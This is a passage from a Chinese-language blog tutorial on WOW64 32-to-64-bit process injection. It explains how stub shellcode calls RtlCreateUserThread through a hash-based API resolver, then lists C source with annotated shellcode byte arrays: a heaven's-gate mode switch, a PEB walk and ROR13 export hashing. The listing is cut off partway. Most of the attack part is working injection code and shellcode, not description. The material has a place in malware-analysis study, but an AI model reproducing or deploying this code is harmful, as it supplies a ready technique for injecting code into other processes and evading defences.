+<h3 id="（三）参数准备、调用GetProcessAddrByHash"><a href="#（三）参数准备、调用GetProcessAddrByHash" class="headerlink" title="（三）参数准备、调用GetProcessAddrByHash"></a>（三）参数准备、调用GetProcessAddrByHash</h3><p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2025%2F10%2F25%2F14-18-22-60633c66690a5da86f28bb1f00bbdfbc-20251025141821887-9ee20a.png"></p>
+<p>上图所示的代码就是为RtlCreateUserThread准备参数，并调用<code>GetProcessAddrByHash</code>寻找到RtlCreateUserThread的地址并调用。</p>
+<p>RtlCreateUserThread是未公开函数（Undocumented Functions），MSDN文档中并未提供其完整定义或使用说明，以下是从这个参考网站中获取其函数定义：<a target="_blank" rel="noopener" href="https://undocumented.ntinternals.net/">NTAPI Undocumented Functions</a></p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2025%2F10%2F25%2F14-27-55-d8c74b0c0104af932172e8003893d0b5-20251025142755116-477088.png"></p>
+<p>在这里我有两个疑问：</p>
+<p><strong>第一个疑问</strong>：这里我有一个疑问为什么不用NtCreateThreadEx，而是用RtlCreateUserThread？可能是RtlCreateUserThread是CreateRemoteThread的低一级的实现。</p>
+<p>RtlCreateUserThread和CreateRemoteThread的最底层实现都是NtCreateThreadEx，按道理来说NtCreateThreadEx也能够实现创建远程线程，至少我在<code>突破seesion 0远程线程注入中</code>成功过，不过在这里不过我并未测试，只是提供了一个思考而已。</p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2025%2F11%2F03%2F20-29-17-95def3c74174ead504b59d2fbb7921d2-20251103202916881-70d629.png"></p>
+<p>在注释我中留了<strong>第二个疑问</strong>：CreateSuspended &#x3D; True，一定是要暂停，为什么要暂停？</p>
+<p>我尝试将True改位False，即将0x01修改为0x00，代码也还是成功执行</p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2025%2F10%2F25%2F14-20-32-0535a156eaeface3314ae8e58e0e48ea-20251025142032502-1e0337.png"></p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2025%2F10%2F25%2F14-21-59-e983085128d63dc0815ce26a43e521fb-20251025142159056-4f4891.png"></p>
+<p>这让我百思不得其解，有知道的师傅可以跟我说一声嘛，真心求教！</p>
+<h3 id="（四）返回结果并清理栈"><a href="#（四）返回结果并清理栈" class="headerlink" title="（四）返回结果并清理栈"></a>（四）返回结果并清理栈</h3><p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2025%2F10%2F27%2F23-12-04-9716ed4b749d86ead261890a4f71669f-20251027231203858-1b94e5.png"></p>
+<ul>
+<li><code>test rax,rax</code>：按位相与，只影响标志位，常用于条件跳转。</li>
+<li><code>jz sucess</code> ：如果rax为0，表明我们成功创建线程，返回TRUE（1）</li>
+<li><code>mov rax,0</code>：如果rax为1，表明创建线程失败，返回FALSE（0）<br>sucess:</li>
+<li><code>mov rax,0 </code><br>cleanup:</li>
+<li><code>and rsp,(32+6*8)</code>：调用一次GetProcAddressByHash产生32B的影子空间，由调用方清理；push 6个参数到栈上，因此使用了6 × 8B &#x3D; 48B的空间。总共使用了32+6 * 8 字节的栈空间，在返回到stub1前要清理掉。 </li>
+<li><code>mov rsp,rdi</code>：恢复原始rsp，恢复之后rsp指向返回地址。</li>
+<li><code>ret</code>：返回到stub1。</li>
+</ul>
+<p>至此两段stub shellcode的编写就介绍完了，有没有感觉精彩绝伦呢？这简直是艺术品，技术的魅力令人陶醉，让人沉迷……</p>
+<p>在这里多提一嘴文章写的很繁琐，这是我写文的风格，看不惯我也没办法。</p>
+<h2 id="1-3-inject"><a href="#1-3-inject" class="headerlink" title="1.3 inject"></a>1.3 inject</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main.cpp</span></span><br><span class="line"><span class="comment">// 32 → 64 位进程注入（WOW64 migrate 桩最小版）</span></span><br><span class="line"><span class="comment">// VS2019+ Win32 平台编译</span></span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;tlhelp32.h&gt;</span><br><span class="line"></span><br><span class="line">unsigned char migrate_executex64[] = &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 切换堆栈、保存非易失性寄存器和参数传递</span></span><br><span class="line">    <span class="number">0x55</span>,                         <span class="comment">// push    ebp                                ; 压入栈底指针</span></span><br><span class="line">    <span class="number">0x89</span>,<span class="number">0xE5</span>,                    <span class="comment">// mov     ebp, esp                           ; 创建一个新栈帧</span></span><br><span class="line">    <span class="number">0x56</span>,                         <span class="comment">// push    esi                                ; 保存esi</span></span><br><span class="line">    <span class="number">0x57</span>,                         <span class="comment">// push    edi                                ; 保存edi</span></span><br><span class="line">    <span class="number">0x8B</span>,<span class="number">0x75</span>,<span class="number">0x08</span>,               <span class="comment">// mov     esi, [ebp+8]                       ; pFunction函数指针</span></span><br><span class="line">    <span class="number">0x8B</span>,<span class="number">0x4D</span>,<span class="number">0x0C</span>,               <span class="comment">// mov     ecx, [ebp+0Ch]                     ; ctx的地址</span></span><br><span class="line">    <span class="number">0xE8</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,     <span class="comment">// call    delta                              ; 跳转到下一条指令，并在栈上留下下一条指令的地址。</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// CPU短模式切换成长模式，执行需要在x64模式下执行的机器码</span></span><br><span class="line">    <span class="number">0x58</span>,                         <span class="comment">// pop     eax                                ; eax = 当前EIP</span></span><br><span class="line">    <span class="number">0x83</span>,<span class="number">0xC0</span>,<span class="number">0x2b</span>,               <span class="comment">// add     eax, 43                            ; eax += 0x2b</span></span><br><span class="line">    <span class="number">0x83</span>,<span class="number">0xEC</span>,<span class="number">0x08</span>,               <span class="comment">// sub     esp, 8                             </span></span><br><span class="line">    <span class="number">0x89</span>,<span class="number">0xE2</span>,                    <span class="comment">// mov     edx, esp                           ; edx -&gt; 8字节洞</span></span><br><span class="line">    <span class="number">0xC7</span>,<span class="number">0x42</span>,<span class="number">0x04</span>,<span class="number">0x33</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>, <span class="comment">// mov [edx+4], 0x33                    ; 段选择子（64 位用户代码段）</span></span><br><span class="line">    <span class="number">0x89</span>,<span class="number">0x02</span>,                    <span class="comment">// mov     [edx], eax                         ; 偏移 = 64位入口</span></span><br><span class="line">    <span class="number">0xE8</span>,<span class="number">0x0f</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,     <span class="comment">// call    go_all_native                      ; 跳转到go_all_native处的代码，并在栈上留下下一条指令的地址。</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x66</span>,<span class="number">0x8c</span>,<span class="number">0xd8</span>,      <span class="comment">// mov ax, ds</span></span><br><span class="line">    <span class="number">0x66</span>,<span class="number">0x8e</span>,<span class="number">0xd0</span>,     <span class="comment">// mov ss, ax</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 恢复堆栈和非易失性寄存器，最后返回到inject的代码中，执行inject的后续流程</span></span><br><span class="line">    <span class="number">0x83</span>,<span class="number">0xC4</span>,<span class="number">0x14</span>,               <span class="comment">// add     esp, 20                            ; 8字节 = 远跳转结构+4字节 = go_all_native的返回地址+8字节 = native_x64中push的qword</span></span><br><span class="line">    <span class="number">0x5F</span>,                         <span class="comment">// pop     edi</span></span><br><span class="line">    <span class="number">0x5E</span>,                         <span class="comment">// pop     esi</span></span><br><span class="line">    <span class="number">0x5D</span>,                         <span class="comment">// pop     ebp</span></span><br><span class="line">    <span class="number">0xC2</span>,<span class="number">0x08</span>,<span class="number">0x00</span>,               <span class="comment">// ret     8</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 0x32  go_all_native:</span></span><br><span class="line">    <span class="number">0x8B</span>,<span class="number">0x3C</span>,<span class="number">0x24</span>,               <span class="comment">// mov     edi, [esp]                         ; 取WoW64返回地址返回地址</span></span><br><span class="line">    <span class="number">0xFF</span>,<span class="number">0x2A</span>,                    <span class="comment">// jmp     fword ptr [edx]                    ; 切64位，远跳转到x64代码段</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 以下代码在x64模式下执行，CPU从64为转为32为</span></span><br><span class="line">    <span class="number">0x48</span>,<span class="number">0x31</span>,<span class="number">0xC0</span>,               <span class="comment">// xor rax, rax</span></span><br><span class="line">    <span class="number">0x57</span>,                         <span class="comment">// push rdi                                   ; 保存RDI (包含WoW64返回地址)</span></span><br><span class="line">    <span class="number">0xFF</span>,<span class="number">0xD6</span>,                    <span class="comment">// call rsi                                   ;调用x64函数: X64FUNCTION(dwParameter)</span></span><br><span class="line">    <span class="number">0x5F</span>,                         <span class="comment">// pop rdi                                    ;恢复RDI (WoW64返回地址)</span></span><br><span class="line">    <span class="number">0x50</span>,                         <span class="comment">// push rax                                   ;将返回值(hThread)压栈 (同时分配8字节空间)</span></span><br><span class="line">    <span class="number">0xC7</span>,<span class="number">0x44</span>,<span class="number">0x24</span>,<span class="number">0x04</span>,<span class="number">0x23</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>, <span class="comment">// mov DWORD PTR [rsp+4], 0x23     ; 设置段选择子为0x23 (WoW64模式)</span></span><br><span class="line">    <span class="number">0x89</span>,<span class="number">0x3C</span>,<span class="number">0x24</span>,               <span class="comment">//  mov DWORD PTR [rsp], edi                  ;设置偏移地址为WoW64返回地址</span></span><br><span class="line">    <span class="number">0xFF</span>,<span class="number">0x2C</span>,<span class="number">0x24</span>                <span class="comment">// jmp dword PTR [rsp]                        ;远跳转回WoW64模式</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">unsigned char migrate_wownativex[] = &#123;</span><br><span class="line">    <span class="comment">// ================ 第1段：初始化与栈对齐 ==================</span></span><br><span class="line">    <span class="number">0xFC</span>,                         <span class="comment">// cld                          ; 清除方向标志</span></span><br><span class="line">    <span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0xCE</span>,               <span class="comment">// mov     rsi, rcx             ; 保存第一个参数（目标函数指针）</span></span><br><span class="line">    <span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0xE7</span>,               <span class="comment">// mov     rdi, rsp             ; 保存原始栈指针</span></span><br><span class="line">    <span class="number">0x48</span>,<span class="number">0x83</span>,<span class="number">0xE4</span>,<span class="number">0xF0</span>,          <span class="comment">// and     rsp, 0xfffffffffffffff0 ; 栈对齐到16字节</span></span><br><span class="line">    <span class="number">0xE8</span>,<span class="number">0xC8</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,     <span class="comment">// call    start                ; 获取当前地址（用于定位数据）</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// GetProcAddressByHash:</span></span><br><span class="line">    <span class="comment">// ================ 第2段：寄存器压栈保护 ==================</span></span><br><span class="line">    <span class="number">0x41</span>,<span class="number">0x51</span>,                    <span class="comment">// push    r9</span></span><br><span class="line">    <span class="number">0x41</span>,<span class="number">0x50</span>,                    <span class="comment">// push    r8</span></span><br><span class="line">    <span class="number">0x52</span>,                         <span class="comment">// push    rdx</span></span><br><span class="line">    <span class="number">0x51</span>,                         <span class="comment">// push    rcx</span></span><br><span class="line">    <span class="number">0x56</span>,                         <span class="comment">// push    rsi</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ================ 第3段：遍历PEB获取ntdll模块基址 ==========</span></span><br><span class="line">    <span class="number">0x48</span>,<span class="number">0x31</span>,<span class="number">0xD2</span>,               <span class="comment">// xor     rdx, rdx</span></span><br><span class="line">    <span class="number">0x65</span>,<span class="number">0x48</span>,<span class="number">0x8B</span>,<span class="number">0x52</span>,<span class="number">0x60</span>,     <span class="comment">// mov     rdx, gs:[rdx+0x60]   ; 获取PEB</span></span><br><span class="line">    <span class="number">0x48</span>,<span class="number">0x8B</span>,<span class="number">0x52</span>,<span class="number">0x18</span>,          <span class="comment">// mov     rdx, [rdx+0x18]      ; PEB-&gt;Ldr</span></span><br><span class="line">    <span class="number">0x48</span>,<span class="number">0x8B</span>,<span class="number">0x52</span>,<span class="number">0x20</span>,          <span class="comment">// mov     rdx, [rdx+0x20]      ; InMemoryOrderModuleList</span></span><br><span class="line">    <span class="number">0x48</span>,<span class="number">0x8B</span>,<span class="number">0x72</span>,<span class="number">0x50</span>,          <span class="comment">// mov     rsi, [rdx+0x50]      ; 第一个模块的BaseDllName.Buffer</span></span><br><span class="line">    <span class="number">0x48</span>,<span class="number">0x0F</span>,<span class="number">0xB7</span>,<span class="number">0x4A</span>,<span class="number">0x4A</span>,     <span class="comment">// movzx   rcx, word ptr [rdx+0x4a] ; 模块名长度</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ================ 第4段：计算模块名哈希（用于匹配） ========</span></span><br><span class="line">    <span class="number">0x4D</span>,<span class="number">0x31</span>,<span class="number">0xC9</span>,               <span class="comment">// xor     r9, r9               ; 初始化哈希值</span></span><br><span class="line">    <span class="number">0x48</span>,<span class="number">0x31</span>,<span class="number">0xC0</span>,               <span class="comment">// xor     rax, rax</span></span><br><span class="line">    <span class="comment">//hash_loop:</span></span><br><span class="line">        <span class="number">0xAC</span>,                         <span class="comment">// lodsb                        ; 读取一个字符</span></span><br><span class="line">        <span class="number">0x3C</span>,<span class="number">0x61</span>,                    <span class="comment">// cmp     al, &#x27;a&#x27;</span></span><br><span class="line">        <span class="number">0x7C</span>,<span class="number">0x02</span>,                    <span class="comment">// jl      no_lower</span></span><br><span class="line">        <span class="number">0x2C</span>,<span class="number">0x20</span>,                    <span class="comment">// sub     al, 0x20             ; 转换为大写</span></span><br><span class="line">        <span class="comment">//no_lower :</span></span><br><span class="line">            <span class="number">0x41</span>,<span class="number">0xC1</span>,<span class="number">0xC9</span>,<span class="number">0x0D</span>,          <span class="comment">// ror     r9d, 13              ; 哈希旋转</span></span><br><span class="line">            <span class="number">0x41</span>,<span class="number">0x01</span>,<span class="number">0xC1</span>,               <span class="comment">// add     r9d, eax             ; 累加字符</span></span><br><span class="line">            <span class="number">0xE2</span>,<span class="number">0xED</span>,                    <span class="comment">// loop    hash_loop            ; 循环处理所有字符</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// ================ 第5段：定位导出表并验证PE结构 ==========</span></span><br><span class="line">            <span class="number">0x52</span>,                         <span class="comment">// push    rdx                  ; 保存当前模块地址</span></span><br><span class="line">            <span class="number">0x41</span>,<span class="number">0x51</span>,                    <span class="comment">// push    r9                   ; 保存模块哈希</span></span><br><span class="line">            <span class="number">0x48</span>,<span class="number">0x8B</span>,<span class="number">0x52</span>,<span class="number">0x20</span>,          <span class="comment">// mov     rdx, [rdx+0x20]      ; 获取模块基址</span></span><br><span class="line">            <span class="number">0x8B</span>,<span class="number">0x42</span>,<span class="number">0x3C</span>,               <span class="comment">// mov     eax, [rdx+0x3c]      ; e_lfanew</span></span><br><span class="line">            <span class="number">0x48</span>,<span class="number">0x01</span>,<span class="number">0xD0</span>,               <span class="comment">// add     rax, rdx             ; PE头地址</span></span><br><span class="line">            <span class="number">0x66</span>,<span class="number">0x81</span>,<span class="number">0x78</span>,<span class="number">0x18</span>,<span class="number">0x0B</span>,<span class="number">0x02</span>, <span class="comment">// cmp   word [rax+0x18], 0x20b ; 检查是否为64位PE</span></span><br><span class="line">            <span class="number">0x75</span>,<span class="number">0x72</span>,                    <span class="comment">// jne     next_module          ; 不是则跳过</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// ================ 第6段：解析导出表 =======================</span></span><br><span class="line">            <span class="number">0x8B</span>,<span class="number">0x80</span>,<span class="number">0x88</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>, <span class="comment">// mov   eax, [rax+0x88]       ; 导出表RVA</span></span><br><span class="line">            <span class="number">0x48</span>,<span class="number">0x85</span>,<span class="number">0xC0</span>,               <span class="comment">// test    rax, rax</span></span><br><span class="line">            <span class="number">0x74</span>,<span class="number">0x67</span>,                    <span class="comment">// je      next_module          ; 无导出表则跳过</span></span><br><span class="line">            <span class="number">0x48</span>,<span class="number">0x01</span>,<span class="number">0xD0</span>,               <span class="comment">// add     rax, rdx             ; 导出表VA</span></span><br><span class="line">            <span class="number">0x50</span>,                         <span class="comment">// push    rax                  ; 保存导出表地址</span></span><br><span class="line">            <span class="number">0x8B</span>,<span class="number">0x48</span>,<span class="number">0x18</span>,               <span class="comment">// mov     ecx, [rax+0x18]      ; NumberOfNames</span></span><br><span class="line">            <span class="number">0x44</span>,<span class="number">0x8B</span>,<span class="number">0x40</span>,<span class="number">0x20</span>,          <span class="comment">// mov     r8d, [rax+0x20]      ; AddressOfNames RVA</span></span><br><span class="line">            <span class="number">0x49</span>,<span class="number">0x01</span>,<span class="number">0xD0</span>,               <span class="comment">// add     r8, rdx              ; AddressOfNames VA</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// ================ 第7段：遍历导出函数名查找目标函数 =======</span></span><br><span class="line">            <span class="number">0xE3</span>,<span class="number">0x56</span>,                    <span class="comment">// jecxz   resolve_by_ordinal   ; 无函数名则跳过</span></span><br><span class="line">            <span class="comment">//name_loop:</span></span><br><span class="line">                <span class="number">0x48</span>,<span class="number">0xFF</span>,<span class="number">0xC9</span>,               <span class="comment">// dec     rcx</span></span><br><span class="line">                <span class="number">0x41</span>,<span class="number">0x8B</span>,<span class="number">0x34</span>,<span class="number">0x88</span>,          <span class="comment">// mov     esi, [r8+rcx*4]      ; 函数名RVA</span></span><br><span class="line">                <span class="number">0x48</span>,<span class="number">0x01</span>,<span class="number">0xD6</span>,               <span class="comment">// add     rsi, rdx             ; 函数名VA</span></span><br><span class="line">                <span class="number">0x4D</span>,<span class="number">0x31</span>,<span class="number">0xC9</span>,               <span class="comment">// xor     r9, r9               ; 初始化函数名哈希</span></span><br><span class="line">                <span class="number">0x48</span>,<span class="number">0x31</span>,<span class="number">0xC0</span>,               <span class="comment">// xor     rax, rax</span></span><br><span class="line">                <span class="comment">//func_hash_loop :</span></span><br><span class="line">                    <span class="number">0xAC</span>,                         <span class="comment">// lodsb</span></span><br><span class="line">                    <span class="number">0x41</span>,<span class="number">0xC1</span>,<span class="number">0xC9</span>,<span class="number">0x0D</span>,          <span class="comment">// ror     r9d, 13</span></span><br><span class="line">                    <span class="number">0x41</span>,<span class="number">0x01</span>,<span class="number">0xC1</span>,               <span class="comment">// add     r9d, eax</span></span><br><span class="line">                    <span class="number">0x38</span>,<span class="number">0xE0</span>,                    <span class="comment">// cmp     al, ah               ; 检查是否为字符串结尾</span></span><br><span class="line">                    <span class="number">0x75</span>,<span class="number">0xF1</span>,                    <span class="comment">// jne     func_hash_loop</span></span><br><span class="line">                    <span class="number">0x4C</span>,<span class="number">0x03</span>,<span class="number">0x4C</span>,<span class="number">0x24</span>,<span class="number">0x08</span>,     <span class="comment">// add     r9, [rsp+8]          ; 加上模块基址（实际是模块哈希？）</span></span><br><span class="line">                    <span class="number">0x45</span>,<span class="number">0x39</span>,<span class="number">0xD1</span>,               <span class="comment">// cmp     r9d, r10d            ; 与目标哈希比较</span></span><br><span class="line">                    <span class="number">0x75</span>,<span class="number">0xD8</span>,                    <span class="comment">// jne     name_loop            ; 不匹配则继续</span></span><br><span class="line"></span><br><span class="line">                    <span class="comment">// ================ 第8段：解析函数地址并调用 ==============</span></span><br><span class="line">                    <span class="number">0x58</span>,                         <span class="comment">// pop     rax                  ; 恢复导出表地址</span></span><br><span class="line">                    <span class="number">0x44</span>,<span class="number">0x8B</span>,<span class="number">0x40</span>,<span class="number">0x24</span>,          <span class="comment">// mov     r8d, [rax+0x24]      ; AddressOfNameOrdinals RVA</span></span><br><span class="line">                    <span class="number">0x49</span>,<span class="number">0x01</span>,<span class="number">0xD0</span>,               <span class="comment">// add     r8, rdx              ; AddressOfNameOrdinals VA</span></span><br><span class="line">                    <span class="number">0x66</span>,<span class="number">0x41</span>,<span class="number">0x8B</span>,<span class="number">0x0C</span>,<span class="number">0x48</span>,     <span class="comment">// mov     cx, [r8+rcx*2]       ; 函数序号</span></span><br><span class="line">                    <span class="number">0x44</span>,<span class="number">0x8B</span>,<span class="number">0x40</span>,<span class="number">0x1C</span>,          <span class="comment">// mov     r8d, [rax+0x1c]      ; AddressOfFunctions RVA</span></span><br><span class="line">                    <span class="number">0x49</span>,<span class="number">0x01</span>,<span class="number">0xD0</span>,               <span class="comment">// add     r8, rdx              ; AddressOfFunctions VA</span></span><br><span class="line">                    <span class="number">0x41</span>,<span class="number">0x8B</span>,<span class="number">0x04</span>,<span class="number">0x88</span>,          <span class="comment">// mov     eax, [r8+rcx*4]      ; 函数RVA</span></span><br><span class="line">                    <span class="number">0x48</span>,<span class="number">0x01</span>,<span class="number">0xD0</span>,               <span class="comment">// add     rax, rdx             ; 函数VA</span></span><br><span class="line"></span><br><span class="line">                    <span class="comment">// ================ 第9段：恢复寄存器并跳转执行 ============</span></span><br><span class="line">                    <span class="number">0x41</span>,<span class="number">0x58</span>,                    <span class="comment">// pop     r8</span></span><br><span class="line">                    <span class="number">0x41</span>,<span class="number">0x58</span>,                    <span class="comment">// pop     r8</span></span><br><span class="line">                    <span class="number">0x5E</span>,                         <span class="comment">// pop     rsi</span></span><br><span class="line">                    <span class="number">0x59</span>,                         <span class="comment">// pop     rcx</span></span><br><span class="line">                    <span class="number">0x5A</span>,                         <span class="comment">// pop     rdx</span></span><br><span class="line">                    <span class="number">0x41</span>,<span class="number">0x58</span>,                    <span class="comment">// pop     r8</span></span><br><span class="line">                    <span class="number">0x41</span>,<span class="number">0x59</span>,                    <span class="comment">// pop     r9</span></span><br><span class="line">                    <span class="number">0x41</span>,<span class="number">0x5A</span>,                    <span class="comment">// pop     r10</span></span><br><span class="line">                    <span class="number">0x48</span>,<span class="number">0x83</span>,<span class="number">0xEC</span>,<span class="number">0x20</span>,          <span class="comment">// sub     rsp, 0x20            ; 为调用准备栈空间</span></span><br><span class="line">                    <span class="number">0x41</span>,<span class="number">0x52</span>,                    <span class="comment">// push    r10</span></span><br><span class="line">                    <span class="number">0xFF</span>,<span class="number">0xE0</span>,                    <span class="comment">// jmp     rax                  ; 跳转到目标函数</span></span><br><span class="line"></span><br><span class="line">                    <span class="comment">// ================ 第10段：模块遍历失败处理 ===============</span></span><br><span class="line">                    <span class="number">0x58</span>,                         <span class="comment">// pop     rax</span></span><br><span class="line">                    <span class="number">0x41</span>,<span class="number">0x59</span>,                    <span class="comment">// pop     r9</span></span><br><span class="line">                    <span class="number">0x5A</span>,                         <span class="comment">// pop     rdx</span></span><br><span class="line">                    <span class="number">0x48</span>,<span class="number">0x8B</span>,<span class="number">0x12</span>,               <span class="comment">// mov     rdx, [rdx]           ; 获取下一个模块</span></span><br><span class="line">                    <span class="number">0xE9</span>,<span class="number">0x4F</span>,<span class="number">0xFF</span>,<span class="number">0xFF</span>,<span class="number">0xFF</span>,     <span class="comment">// jmp     hash_loop            ; 继续遍历</span></span><br><span class="line"></span><br><span class="line">                    <span class="comment">//start:</span></span><br><span class="line">                    <span class="comment">// ================ 第11段：调用目标函数（RtlCreateUserThread）===</span></span><br><span class="line">                    <span class="number">0x5D</span>,                         <span class="comment">// pop     rbp                  ; 获取GetProcAddressByHash地址</span></span><br><span class="line">                    <span class="number">0x4D</span>,<span class="number">0x31</span>,<span class="number">0xC9</span>,               <span class="comment">// xor     r9, r9               ; StackZeroBits = 0</span></span><br><span class="line">                    <span 